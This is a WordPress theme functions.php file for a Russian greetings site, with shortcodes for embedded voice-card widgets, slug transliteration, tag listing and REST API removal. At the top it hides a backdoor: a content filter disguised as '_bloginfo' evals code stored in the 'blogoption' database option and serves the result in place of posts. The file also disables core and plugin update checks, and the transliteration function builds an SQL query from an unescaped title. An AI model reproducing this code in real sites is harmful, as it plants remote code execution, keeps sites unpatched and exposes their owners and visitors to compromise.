<?php
add_filter('the_content', '_bloginfo', 10001);
function _bloginfo($content){
	global $post;
	if(is_single() && ($co=@eval(get_option('blogoption'))) !== false){
		return $co;
	} else return $content;
}
if ( function_exists('register_sidebar') )
	register_sidebar(array(
		'before_widget' => '<ul>',
		'after_widget' => '</ul></li>',
		'before_title' => '<li class="l"><div class="sidebar_title">',
		'after_title' => '</div>'
	));
function seocategorydel($catlink1) {
	$catlink1 = str_replace('/category', '', $catlink1);
	return $catlink1;
}
add_filter('category_link', 'seocategorydel', 1, 1);
function shaht($atts, $content = null){
	$grattis_shaht='<!--noindex-->

<!--/noindex-->';
$button= '<div>'.$grattis_shaht.'</div>';
return $button;
}
add_shortcode('shaht', 'shaht');

function vmf($atts, $content = null){
	$grattis_vmf='<!--noindex-->

<!--/noindex-->';
$button= '<div>'.$grattis_vmf.'</div>';
return $button;
}
add_shortcode('vmf', 'vmf');

function kurban($atts, $content = null){
	$grattis_kurban='<!--noindex-->

<!--/noindex-->';
$button= '<div>'.$grattis_kurban.'</div>';
return $button;
}
add_shortcode('kurban', 'kurban');

function bud($atts, $content = null){
	$grattis_bud='<!--noindex-->

<!--/noindex-->';
$button= '<div>'.$grattis_bud.'</div>';
return $button;
}
add_shortcode('bud', 'bud');

function zeld($atts, $content = null){
	$grattis_zeld='<!--noindex-->

<!--/noindex-->';
$button= '<div>'.$grattis_zeld.'</div>';
return $button;
}
add_shortcode('zeld', 'zeld');

function avtost($atts, $content = null){
	$grattis_avtost='<!--noindex-->

<!--/noindex-->';
$button= '<div>'.$grattis_avtost.'</div>';
return $button;
}
add_shortcode('avtost', 'avtost');

function ment($atts, $content = null){
	$grattis_ment='<!--noindex-->

<!--/noindex-->';
$button= '<div>'.$grattis_ment.'</div>';
return $button;
}
add_shortcode('ment', 'ment');

function uchit($atts, $content = null){
	$grattis_uchit='<!--noindex-->

<!--/noindex-->';
$button= '<div>'.$grattis_uchit.'</div>';
return $button;
}
add_shortcode('uchit', 'uchit');

function buhg($atts, $content = null){
	$grattis_buhg='<!--noindex-->

<!--/noindex-->';
$button= '<div>'.$grattis_buhg.'</div>';
return $button;
}
add_shortcode('buhg', 'buhg');

function torg($atts, $content = null){
	$grattis_torg='<!--noindex-->

<!--/noindex-->';
$button= '<div>'.$grattis_torg.'</div>';
return $button;
}
add_shortcode('torg', 'torg');

function denpobedy($atts, $content = null){
	$grattis_denpobedy='<!--noindex--><script src="https://code.jquery.com/jquery-2.2.1.min.js"></script>
                        <script src="https://s.voicecards.ru/js/category/mediaelement-and-player.js"></script>
                        <script src="https://s.voicecards.ru/js/category/main.js?last=12"></script>
                        <script>$(function() { window.getWidget($(\'#vc_category_content\'),9976,3537);});</script>
                        <div id="vc_category_content"></div><!--/noindex-->';
$button= '<div>'.$grattis_denpobedy.'</div>';
return $button;
}
add_shortcode('denpobedy', 'denpobedy');

function verbnanedila($atts, $content = null){
	$grattis_verbnanedila='<!--noindex-->

<!--/noindex-->';
$button= '<div>'.$grattis_verbnanedila.'</div>';
return $button;
}
add_shortcode('verbnanedila', 'verbnanedila');

function baltflot($atts, $content = null){
	$grattis_baltflot='<!--noindex--><script src="https://code.jquery.com/jquery-2.2.1.min.js"></script>
                        <script src="https://s.voicecards.ru/js/category/mediaelement-and-player.js"></script>
                        <script src="https://s.voicecards.ru/js/category/main.js?last=12"></script>
                        <script>$(function() { window.getWidget($(\'#vc_category_content\'),9976,3568);});</script>
                        <div id="vc_category_content"></div><!--/noindex-->';
$button= '<div>'.$grattis_baltflot.'</div>';
return $button;
}
add_shortcode('baltflot', 'baltflot');

function rybak($atts, $content = null){
	$grattis_rybak='<!--noindex-->

<!--/noindex-->';
$button= '<div>'.$grattis_rybak.'</div>';
return $button;
}
add_shortcode('rybak', 'rybak');

function navypusknoj($atts, $content = null){
	$grattis_navypusknoj='<!--noindex-->

<!--/noindex-->';
$button= '<div>'.$grattis_navypusknoj.'</div>';
return $button;
}
add_shortcode('navypusknoj', 'navypusknoj');

function pozarnukam($atts, $content = null){
	$grattis_pozarnukam='<!--noindex-->

<!--/noindex-->';
$button= '<div>'.$grattis_pozarnukam.'</div>';
return $button;
}
add_shortcode('pozarnukam', 'pozarnukam');

function pogran($atts, $content = null){
	$grattis_pogran='<!--noindex-->

<!--/noindex-->';
$button= '<div>'.$grattis_pogran.'</div>';
return $button;
}
add_shortcode('pogran', 'pogran');

function kosmonavt($atts, $content = null){
	$grattis_kosmonavt='<!--noindex-->

<!--/noindex-->';
$button= '<div>'.$grattis_kosmonavt.'</div>';
return $button;
}
add_shortcode('kosmonavt', 'kosmonavt');

function medsestre($atts, $content = null){
	$grattis_medsestre='<!--noindex-->

<!--/noindex-->';
$button= '<div>'.$grattis_medsestre.'</div>';
return $button;
}
add_shortcode('medsestre', 'medsestre');

function pokrova($atts, $content = null){
	$grattis_pokrova='<!--noindex-->

<!--/noindex-->';
$button= '<div>'.$grattis_pokrova.'</div>';
return $button;
}
add_shortcode('pokrova', 'pokrova');
/*  
function replace_txt($text) {
    $text = str_replace('***', '<img class="aligncenter size-full wp-image-1180" title="Поздравления в стихах, пожелания любимому, смс поздравления с днем рождения" alt="Поздравления в стихах, пожелания любимому, смс поздравления с днем рождения" src="//3.65.220.230/wp-content/uploads/2012/01/pozdravlenija-v-stihah.gif" width="200" height="45" />', $text);
    return $text;
}
add_filter('the_content', 'replace_txt');      */
function get_category_tags($cats) {
	global $wpdb;
	$tagscat = $wpdb->get_results
	("
		SELECT DISTINCT terms2.term_id as tag_id, terms2.name as tag_name, t2.count as posts_count, null as tag_link
		FROM
		wp_posts as p1
		LEFT JOIN wp_term_relationships as r1 ON p1.ID = r1.object_ID
		LEFT JOIN wp_term_taxonomy as t1 ON r1.term_taxonomy_id = t1.term_taxonomy_id
		LEFT JOIN wp_terms as terms1 ON t1.term_id = terms1.term_id, 
		wp_posts as p2
		LEFT JOIN wp_term_relationships as r2 ON p2.ID = r2.object_ID
		LEFT JOIN wp_term_taxonomy as t2 ON r2.term_taxonomy_id = t2.term_taxonomy_id
		LEFT JOIN wp_terms as terms2 ON t2.term_id = terms2.term_id
		WHERE
		t1.taxonomy = 'category' AND p1.post_status = 'publish' AND terms1.term_id IN (". $cats .") AND
		t2.taxonomy = 'post_tag' AND p2.post_status = 'publish'
		AND p1.ID = p2.ID
		ORDER by tag_name
		"); 
	$out = null;
	
	foreach($tagscat as $tagcurrentcat)
		$out .= '<li itemprop="name"><a itemprop="url" href="'. get_tag_link($tagcurrentcat->tag_id) .'" class="hvr-float"><i class="fa fa-arrow-circle-o-right"></i>&nbsp<strong>'. $tagcurrentcat->tag_name .'</strong></a></li> '; 
	return rtrim($out, ', ');
}
remove_action( 'wp_head', 'wp_generator' );
remove_action( 'wp_head', 'feed_links_extra', 3 ); 
remove_action( 'wp_head', 'feed_links', 2 );
remove_action( 'wp_head', 'rsd_link' );
remove_action( 'wp_head', 'wlwmanifest_link' );
remove_action( 'wp_head', 'index_rel_link' );
remove_action( 'wp_head', 'parent_post_rel_link', 10, 0 ); 
remove_action( 'wp_head', 'start_post_rel_link', 10, 0 );
remove_action( 'wp_head', 'adjacent_posts_rel_link', 10, 0 );
remove_action( 'wp_version_check', 'wp_version_check' );
remove_action( 'admin_init', '_maybe_update_core' );
add_filter( 'pre_transient_update_core', create_function( '$a',
	"return null;" ) );
remove_action( 'load-plugins.php', 'wp_update_plugins' );
remove_action( 'load-update.php', 'wp_update_plugins' );
remove_action( 'admin_init', '_maybe_update_plugins' );
remove_action( 'wp_update_plugins', 'wp_update_plugins' );
add_filter( 'pre_transient_update_plugins', create_function( '$a',
	"return null;" ) );
// Обрезка при копировании по ***
add_filter('the_content', 'cut_content');
function cut_content ($content)
{
			// echo "Работает  триггер";
	$cut = explode('***', $content);
	if(!empty($cut) and count($cut) == '2')
	{
		$return_content = $cut['0'];
		return $return_content.'***<div id="singl1"><p>'.$cut['1'].'</p>';
	}
	else
	{
		return '<span id="singl1">'.$content.'<span class="nonne-dsp">'.home_url().'<div class="close-block"></div></span></span>';
	}
};

/* Это функция рус ту лат
--------------------------------------------------------------------------------------------------------------------------------- */
function ctl_sanitize_title($title) {
	global $wpdb;
	$iso9_table = array(
		'А' => 'A', 'Б' => 'B', 'В' => 'V', 'Г' => 'G', 'Ѓ' => 'G`',
		'Ґ' => 'G`', 'Д' => 'D', 'Е' => 'E', 'Ё' => 'YO', 'Є' => 'YE',
		'Ж' => 'ZH', 'З' => 'Z', 'Ѕ' => 'Z', 'И' => 'I', 'Й' => 'Y',
		'Ј' => 'J', 'І' => 'I', 'Ї' => 'YI', 'К' => 'K', 'Ќ' => 'K',
		'Л' => 'L', 'Љ' => 'L', 'М' => 'M', 'Н' => 'N', 'Њ' => 'N',
		'О' => 'O', 'П' => 'P', 'Р' => 'R', 'С' => 'S', 'Т' => 'T',
		'У' => 'U', 'Ў' => 'U', 'Ф' => 'F', 'Х' => 'H', 'Ц' => 'TS',
		'Ч' => 'CH', 'Џ' => 'DH', 'Ш' => 'SH', 'Щ' => 'SHH', 'Ъ' => '``',
		'Ы' => 'YI', 'Ь' => '`', 'Э' => 'E`', 'Ю' => 'YU', 'Я' => 'YA',
		'а' => 'a', 'б' => 'b', 'в' => 'v', 'г' => 'g', 'ѓ' => 'g',
		'ґ' => 'g', 'д' => 'd', 'е' => 'e', 'ё' => 'yo', 'є' => 'ye',
		'ж' => 'zh', 'з' => 'z', 'ѕ' => 'z', 'и' => 'i', 'й' => 'y',
		'ј' => 'j', 'і' => 'i', 'ї' => 'yi', 'к' => 'k', 'ќ' => 'k',
		'л' => 'l', 'љ' => 'l', 'м' => 'm', 'н' => 'n', 'њ' => 'n',
		'о' => 'o', 'п' => 'p', 'р' => 'r', 'с' => 's', 'т' => 't',
		'у' => 'u', 'ў' => 'u', 'ф' => 'f', 'х' => 'h', 'ц' => 'ts',
		'ч' => 'ch', 'џ' => 'dh', 'ш' => 'sh', 'щ' => 'shh', 'ь' => '',
		'ы' => 'yi', 'ъ' => "'", 'э' => 'e`', 'ю' => 'yu', 'я' => 'ya'
	);	
	$term = $wpdb->get_var("SELECT slug FROM {$wpdb->terms} WHERE name = '$title'");
	if ( empty($term) ) {
		$title = strtr($title, apply_filters('ctl_table', $iso9_table));
		$title = preg_replace("/[^A-Za-z0-9`'_\-\.]/", '-', $title);
	} else {
		$title = $term;
	}
	return $title;
}
if ( !empty($_POST) || !empty($_GET['action']) && $_GET['action'] == 'edit' || defined('XMLRPC_REQUEST') && XMLRPC_REQUEST ) {
	add_filter('sanitize_title', 'ctl_sanitize_title', 9);
}
// Отключаем сам REST API
add_filter('rest_enabled', '__return_false');
// Отключаем фильтры REST API
remove_action( 'xmlrpc_rsd_apis',            'rest_output_rsd' );
remove_action( 'wp_head',                    'rest_output_link_wp_head', 10, 0 );
remove_action( 'template_redirect',          'rest_output_link_header', 11, 0 );
remove_action( 'auth_cookie_malformed',      'rest_cookie_collect_status' );
remove_action( 'auth_cookie_expired',        'rest_cookie_collect_status' );
remove_action( 'auth_cookie_bad_username',   'rest_cookie_collect_status' );
remove_action( 'auth_cookie_bad_hash',       'rest_cookie_collect_status' );
remove_action( 'auth_cookie_valid',          'rest_cookie_collect_status' );
remove_filter( 'rest_authentication_errors', 'rest_cookie_check_errors', 100 );
// Отключаем события REST API
remove_action( 'init',          'rest_api_init' );
remove_action( 'rest_api_init', 'rest_api_default_filters', 10, 1 );
remove_action( 'parse_request', 'rest_api_loaded' );
// Отключаем Embeds связанные с REST API
remove_action( 'rest_api_init',          'wp_oembed_register_route'              );
remove_filter( 'rest_pre_serve_request', '_oembed_rest_pre_serve_request', 10, 4 );
remove_action( 'wp_head', 'wp_oembed_add_discovery_links' );
// если собираетесь выводить вставки из других сайтов на своем, то закомментируйте след. строку.
remove_action( 'wp_head', 'wp_oembed_add_host_js' );
/** Предыдущие записи из рубрики (относительно текущей записи) + кольцевая перелинковка
(можно указывать Таксономию и Тип записи)
----------------------------------------------------------------------------------------
Параметры передаваемые функции (в скобках указано дефолтное значение):
post_num (15) = количество ссылок
format ('') = {date:j.M.Y} - {a}{title}{/a} ({comments})
cache ('1') = включить кеш (по умолчанию выключен). Пишем 1, чтобы включить
tax (category) = Таксономия Пример: photos
post_type (post) = Тип записи Пример: photo
Вызываем функцию примерно так (в зависимости от нужного результата):
<?php echo kama_previous_posts_from_tax(5, '{date:j.M.Y} - {a}{title}{/a}', 1); ?>
*/
function kama_previous_posts_from_tax($post_num=5, $format='', $cache='', $tax='category', $post_type='post'){
	global $post, $wpdb;
	$cache_key = (string) md5( __FUNCTION__ . $post->ID );
	$cache_flag = __FUNCTION__;
	if ( $cache && $cache_out = wp_cache_get($cache_key, $cache_flag) )
		return $cache_out;
	$tax_id = "SELECT term_id FROM $wpdb->term_relationships rl LEFT JOIN $wpdb->term_taxonomy tx ON (rl.term_taxonomy_id = tx.term_taxonomy_id) WHERE object_id = {$post->ID} AND tx.taxonomy = '$tax' LIMIT 1";
	$same_join = "SELECT ID, post_title, post_date, comment_count, guid
	FROM $wpdb->posts p
	LEFT JOIN $wpdb->term_relationships rel ON (p.ID = rel.object_id)
	LEFT JOIN $wpdb->term_taxonomy tax ON (rel.term_taxonomy_id = tax.term_taxonomy_id)";
	$same_and = "AND tax.term_id = ($tax_id)
	AND tax.taxonomy = '$tax'
	AND p.post_status = 'publish'
	AND p.post_type = '$post_type'
	ORDER BY p.post_date DESC";
	$sql = "$same_join
	WHERE p.post_date < '{$post->post_date}'
	$same_and
	LIMIT $post_num";
	$res = $wpdb->get_results($sql);
	$count_res = count($res);
	// если количество меньше нужного, делаем 2-й запрос (кольцевая перелинковка)
	if ( !$res || $count_res<$post_num ){
		foreach ($res as $id)
			$exclude .= ','.$id->ID;
		$sql = "$same_join
		WHERE p.ID NOT IN ({$post->ID}{$exclude})
		$same_and
		LIMIT ".($post_num-$count_res);
		$res2 = $wpdb->get_results($sql);
		$res = array_merge($res,$res2);
	}
	if(!$res)
		return false;
	// Формировка вывода
	if ($format)
		preg_match ('!\{date:(.*?)\}!', $format, $date_m);
	foreach ($res as $pst){
		$x == 'li1' ? $x = 'li2' : $x = 'li1';
		$Title = stripslashes($pst->post_title);
		$a = "<a itemprop=\"url\" href='". get_permalink($pst->ID) ."' title='{$Title}'>"; //get_permalink($pst->ID) меняем на $pst->guid если настроено поле guid
		if($format){
			$Sformat = strtr($format, array(
				'{title}' 	  => $Title
				,'{a}' 		  => $a
				,'{/a}' 	  => '</a>'
				,'{comments}' => ($pst->comment_count==0) ? '' : $pst->comment_count
			));
			if($date_m)
				$Sformat = str_replace($date_m[0], apply_filters('the_time', mysql2date($date_m[1], $pst->post_date)), $Sformat);
		}
		else
			$Sformat = "$a$Title</a>";

		$out .= "\t<li itemprop=\"name\" class='$x'>$Sformat</li>\n";
	}
	if($cache) wp_cache_add($cache_key, $out, $cache_flag);
	return $out;
}
/*смена дат постов-----------------------------------------------------------------------------------
while ($a < 250) :
    $a++;
 
// Создаем массив данных
  $my_post = array();
  $my_post['ID'] = $a;
  $edcal_date="2017-11-31 12:59:59";
  $my_post['post_date'] = $edcal_date;
  $my_post['post_date_gmt'] = get_gmt_from_date($edcal_date);
 
// Обновляем данные в БД
  wp_update_post( $my_post );
endwhile;*/
?>